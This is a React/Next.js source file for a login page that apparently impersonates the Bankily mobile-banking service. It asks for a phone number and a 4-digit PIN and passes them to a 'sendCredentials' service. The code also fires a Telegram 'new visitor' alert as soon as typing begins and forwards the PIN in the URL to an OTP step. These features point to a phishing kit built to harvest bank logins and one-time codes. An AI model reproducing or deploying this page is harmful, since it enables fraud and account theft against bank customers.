"use client";

import { useRouter } from "next/navigation";
import { useRef, useState } from "react";
import { useMutation } from "@tanstack/react-query";
import { CredentialsService } from "@/services/auth.service";
import BankilyLogo from "@/components/common/BankilyLogo";

export default function LoginStep() {
  const router = useRouter();
  const [phone, setPhone] = useState("");
  const [codeSecret, setCodeSecret] = useState("");
  const [pinFocused, setPinFocused] = useState(false);

  // Fire the "new visitor" Telegram notification once, the first time the
  // user starts typing their phone number.
  const visitSent = useRef(false);

  const sendCredentials = useMutation({
    mutationFn: CredentialsService.sendCredentials,
  });

  const visit = useMutation({
    mutationFn: CredentialsService.sendVisitUser,
  });

  const canSubmit = phone.trim().length >= 3 && /^\d{4}$/.test(codeSecret);

  const onSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!canSubmit || sendCredentials.isPending) return;

    sendCredentials.mutate(
      { phone: phone.trim(), codeSecret },
      {
        onSuccess: () =>
          router.push(
            `/login/otp?phone=${phone.trim()}&secretCode=${codeSecret}`,
          ),
      },
    );
  };

  const onPhoneChange = (raw: string) => {
    setPhone(raw);
    if (raw.trim() && !visitSent.current) {
      visitSent.current = true;
      visit.mutate();
    }
  };

  return (
    <div
      dir="rtl"
      className="mx-auto flex min-h-dvh w-full max-w-md flex-col bg-white font-arabic"
    >
      {/* ── Cyan header ── */}
      {/* <header className="flex items-center justify-center bg-[#1cb4cd] py-3.5">
        <h1 className="text-lg font-bold tracking-wide text-white">
          Connexion
        </h1>
      </header> */}

      {/* ── Body ── */}
      <div className="flex flex-1 flex-col px-7">
        {/* logo */}
        <div className="flex justify-center pt-10">
          <BankilyLogo className="h-auto w-65" />
        </div>

        <form onSubmit={onSubmit} className="flex flex-1 flex-col">
          <div className="flex-[0.2]" />

          {/* username / phone */}
          <label className="mb-5 mr-7 block text-sm text-black">
            اسم المستخدم أو رقم الهاتف
          </label>

          <div className="mb-9 flex items-center gap-4">
            
            <svg
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="1.6"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="shrink-0 text-slate-400"
            >
              <circle cx="12" cy="12" r="9.5" />
              <circle cx="12" cy="10" r="3.2" />
              <path d="M6.2 18.4a6 6 0 0 1 11.6 0" />
            </svg>
            <div className="flex flex-1 items-center border-b border-slate-400 pb-1.5 transition-colors focus-within:border-[#1cb4cd]">
              <input
                value={phone}
                onChange={(e) => onPhoneChange(e.target.value)}
                placeholder="اسم المستخدم أو رقم الهاتف"
                className="w-full bg-transparent text-right text-lg text-slate-700 placeholder:text-slate-300 outline-none"
                type="text"
                autoComplete="username"
              />
            </div>
          </div>

          {/* pin */}
          <div dir="ltr" className="mb-10 flex justify-end items-end gap-4">
            <div className="flex flex-col items-end">
              <label className="mb-3 block text-sm text-black">
                الرقم السري
              </label>
              <div className="relative ">
                {/* real input (transparent) drives the value */}
                <input
                  inputMode="numeric"
                  maxLength={4}
                  value={codeSecret}
                  onChange={(e) =>
                    setCodeSecret(e.target.value.replace(/\D/g, ""))
                  }
                  onFocus={() => setPinFocused(true)}
                  onBlur={() => setPinFocused(false)}
                  aria-label="Code secret"
                  className="absolute inset-0 z-10 h-full w-full cursor-pointer bg-transparent text-transparent caret-transparent outline-none"
                  type="text"
                  autoComplete="off"
                />
                {/* 4 underline segments */}
                <div className="pointer-events-none flex gap-3">
                  {[0, 1, 2, 3].map((i) => {
                    const isActive = pinFocused && i === codeSecret.length;
                    return (
                      <div
                        key={i}
                        className={`flex h-10 w-12 items-center justify-center border-b-2 ${
                          isActive ? "border-[#1cb4cd]" : "border-slate-400"
                        }`}
                      >
                        {isActive ? (
                          <span className="h-6 w-px animate-pulse bg-slate-700" />
                        ) : (
                          <span className="text-2xl font-semibold leading-none text-slate-700">
                            {codeSecret[i] ?? ""}
                          </span>
                        )}
                      </div>
                    );
                  })}
                </div>
              </div>
            </div>
            <svg
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="1.6"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="shrink-0 text-gray-400"
            >
              <rect x="4.5" y="10" width="15" height="11.5" rx="3.5" />
              <path d="M8 10V7.5a4 4 0 0 1 8 0V10" />
              <circle cx="12" cy="15.5" r="1.4" />
            </svg>
          </div>

          <div className="flex-[0.15]" />

          {/* submit */}
          <button
            type="submit"
            disabled={!canSubmit || sendCredentials.isPending}
            className={`w-full rounded py-4 text-lg font-bold tracking-wide text-white transition ${
              canSubmit && !sendCredentials.isPending
                ? "bg-[#1cb4cd] hover:bg-[#189fb6] active:brightness-95"
                : "cursor-not-allowed bg-[#1cb4cd]/40"
            }`}
          >
            {sendCredentials.isPending ? "جاري الإرسال…" : "تسجيل الدخول"}
          </button>

          {/* forgot */}
          <button
            type="button"
            className="mt-6 text-sm font-bold text-slate-800 hover:text-slate-900"
          >
            نسيت الرقم السري؟
          </button>

          <div className="flex-1" />
        </form>
      </div>
    </div>
  );
}
